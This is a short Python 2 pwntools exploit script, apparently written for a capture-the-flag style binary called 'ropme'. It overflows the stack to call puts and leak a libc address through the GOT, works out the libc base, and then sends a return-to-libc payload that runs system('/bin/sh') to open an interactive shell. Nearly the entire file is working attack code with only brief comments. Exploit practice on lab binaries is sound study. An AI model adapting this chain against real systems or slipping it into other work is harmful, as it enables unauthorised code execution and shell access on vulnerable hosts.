#!/usr/bin/env python2

from pwn import *

p = process('./ropme')
e = p.elf

p.recvuntil(':', drop=True)
p.recvline()

#override return address to call puts
#call_puts_in_vuln = 0x8048515
jmp_puts = 0x80483b0
call_vuln = 0x8048588
# leak libc addr of puts


payload = fit({
    0x0c: jmp_puts,         # puts expects a ret addr and args on stack
    0x10: call_vuln,        # ret addr
    0x14: e.got['puts'],    # args
})

alt_payload = fit({
    0x0c: jmp_puts,
    0x10: 0x8048379,     # pop ebx, ret; (pops e.got['puts'] off stack)
    0x14: e.got['puts'],
    0x18: call_vuln 
})

p.sendline(alt_payload)

# unpack - takes raw bytes and gives you a number 
# get first four bytes from puts output
puts_addr = u32(p.recvline()[:4])

libc = ELF('/usr/lib/libc-2.30.so')
puts_offset = libc.symbols['puts']

# calculate base address of libc
libc.address = puts_addr - libc.symbols['puts']

system_arg = libc.search('/bin/sh').next()

# after vuln calls puts, it immediately
# sets up the stack and calls fgets
payload2 = fit({
    0x0c: libc.symbols['system'],   # jump to symbols
    0x14: system_arg
})

p.recvline()    #gimme data:

p.sendline(payload2)

p.interactive()
